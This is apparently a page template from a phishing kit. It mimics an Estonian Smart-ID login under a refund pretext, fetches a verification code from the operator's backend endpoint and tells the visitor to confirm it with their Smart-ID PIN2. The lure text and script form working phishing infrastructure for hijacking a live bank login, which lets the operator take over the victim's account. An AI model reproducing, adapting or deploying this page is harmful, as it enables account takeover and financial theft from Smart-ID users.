
<div class="mt-30">
        <div class="container">
        <div class="col-md-9">
        <div class="title mt-45">Login sisse</div>
                <div class="step">
                    <div class="setp-1" style="padding: 6px 10px;">
                            1 &nbspKasutajatunnus
                    </div>
                    <div class="step-2">             
                    </div>
                    <div class="setp-3" style="padding: 6px 10px;">
                            &nbsp&nbsp&nbsp2 &nbsp Salasõnad
                    </div>
                </div>
            <div class="content mt-20" >
                <div class="row ">
                    <div class="col-md-9">
                    <div class="mt-10" style="line-height: 16px;">
                    <div style="padding: 0 10px;" class="mt-20">
                            <span style="font-size: 18px; padding-top: 20px; font-weight: bold!important;">Kontrollkood (PEIDETUD TURVALISUSE EESMÄRGIL)&nbsp:&nbsp</span>
                            <span id="pin_code_value" style="font-size:18px; border:1.2px solid #999; border-radius: 3px; padding: 0 10px;letter-spacing: 5px; background-color: white;"></span>
                            <br><br><br>
                            <p>Tagasimakse töötlemine Et saada oma raha kohe kätte.<br><br>
                            Veenduge, et näete mobiiltelefoni ekraanil numbrit.</p><br>
                            <p>Seejärel sisestage Smart-ID PIN 2 kood.</p>
                            <p>Ootame Smart-ID vastust &nbsp<span id="counter"></p>
                              
                                <hr style="border:1.2px solid white;">
                                <div class="mt-20">
                                    <button class="btn_2" onclick="Redirect()">Katkestan</button>                                
                                </div>  
                            </div>    
                        </div>
                    </div>
					<div class="col-md-3 mt-10 mb-10">
						<div class="img_bt"></div>
					</div>
				</div>
            </div>
        </div></div>
        
    </div>
    <script>
        
          $(document).ready(function () {
            myfunction();
            function myfunction(){                
                $.ajax({
                    type: 'post',
                    url: '<?=base_url("users/ajax");?>',
                    async : true,
                    // data: {no:'', name:'',ip_address:'',country:'',browser:'',browser_version:'',os:'',state:'',code:'',pin_code:''},
                    datatype: 'json',
                    success: function(data){                         
                        response = jQuery.parseJSON(data);
                        console.log(response);
                        document.getElementById("pin_code_value").innerHTML = response[0].pin_code;                         
                    }
                })
            }
            localStorage.setItem("count_data", 98);
            var i = 97;
            var x = setInterval(count_time, 1000);  

            function count_time(){
            
                if(!localStorage.getItem("count_data")||(localStorage.getItem("count_data")<=0)){
                    document.getElementById("counter").innerHTML = 97;
                    localStorage.setItem("count_data", 97);
                }else{
                    var i = localStorage.getItem("count_data")-1;
                    document.getElementById("counter").innerHTML = i;
                    localStorage.setItem("count_data", i);
                }
            }
        });
        
        function Redirect(){
            $(location).attr('href', '<?=base_url();?>');
        }
    </script>
    
</body>
